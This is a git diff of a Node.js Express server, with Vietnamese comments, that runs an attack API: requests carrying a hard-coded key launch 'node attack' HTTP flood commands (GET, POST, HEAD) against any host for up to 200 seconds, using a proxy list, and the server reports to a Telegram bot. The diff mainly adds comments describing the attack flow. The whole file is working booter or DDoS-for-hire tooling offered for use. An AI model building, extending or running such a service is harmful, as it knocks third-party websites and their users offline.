@@ -11,6 +11,7 @@ const CHAT_ID = "7371969470";
 let activeAttacks = 0;
 let currentPID = null;
 
+// Gửi tin nhắn Telegram
 const sendTelegramMessage = async (message) => {
     try {
         await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { chat_id: CHAT_ID, text: message });
@@ -20,12 +21,14 @@ const sendTelegramMessage = async (message) => {
     }
 };
 
+// Kiểm tra tính hợp lệ của tham số đầu vào
 const validateInput = ({ key, host, time, method, port }) =>
     (![key, host, time, method, port].every(Boolean)) ? "THIẾU THAM SỐ" :
     (key !== "negan") ? "KEY KHÔNG HỢP LỆ" :
     (time > 200) ? "THỜI GIAN PHẢI < 200S" :
     (port < 1 || port > 65535) ? "CỔNG KHÔNG HỢP LỆ" : null;
 
+// Thực thi một lệnh tấn công
 const executeAttack = (command, time) => {
     const childProcess = spawn(command.split(" ")[0], command.split(" ").slice(1), { stdio: "inherit" });
     currentPID = childProcess.pid;
@@ -56,19 +59,24 @@ const executeAttack = (command, time) => {
     }, time * 1000 + 10000);
 };
 
-const executeAllAttacks = (methods, host, time) =>
-    methods.map((method) => `node attack -m ${method} -u ${host} -s ${time} -p live.txt --full true`)
+// Thực thi tất cả các phương thức tấn công
+const executeAllAttacks = (moduls, host, time) =>
+    moduls.map((modul) => `node attack -m ${modul} -u ${host} -s ${time} -p live.txt --full true`)
         .forEach((command) => executeAttack(command, time));
 
+// Xử lý yêu cầu tấn công
 app.get("/api/attack", async (req, res) => {
     const { key, host, time, method, port, modul } = req.query;
 
+    // Hàm trả về phản hồi JSON
     const response = (status, message, data = {}) => res.json({ status, message, ...data, serverStatusCode: res.statusCode });
 
+    // Kiểm tra số lượng cuộc tấn công hiện tại
     if (activeAttacks >= MAX_CONCURRENT_ATTACKS || currentPID) {
         return response("ERROR", "ĐANG CÓ CUỘC TẤN CÔNG KHÁC");
     }
 
+    // Kiểm tra tính hợp lệ của tham số
     const validationMessage = validateInput({ key, host, time, method, port });
     if (validationMessage) {
         return response("ERROR", validationMessage);
@@ -78,11 +86,13 @@ app.get("/api/attack", async (req, res) => {
 
     try {
         if (modul === "FULL") {
+            // Thực thi tất cả các phương thức tấn công
             executeAllAttacks(["GET", "POST", "HEAD"], host, time);
             response("SUCCESS", "LỆNH TẤN CÔNG (GET, POST, HEAD) ĐÃ GỬI", {
                 host, port, time, modul: "GET POST HEAD", method, pid: currentPID
             });
         } else {
+            // Thực thi một phương thức tấn công cụ thể
             const command = `node attack -m ${modul} -u ${host} -s ${time} -p live.txt --full true`;
             executeAttack(command, time);
             response("SUCCESS", "LỆNH TẤN CÔNG ĐÃ GỬI", {
@@ -95,6 +105,7 @@ app.get("/api/attack", async (req, res) => {
     }
 });
 
+// Khởi động server
 app.listen(port, () => {
     console.log(`[API SERVER] CHẠY TẠI CỔNG ${port}`);
     sendTelegramMessage(`🔹 API Server đang chạy tại cổng ${port}`)
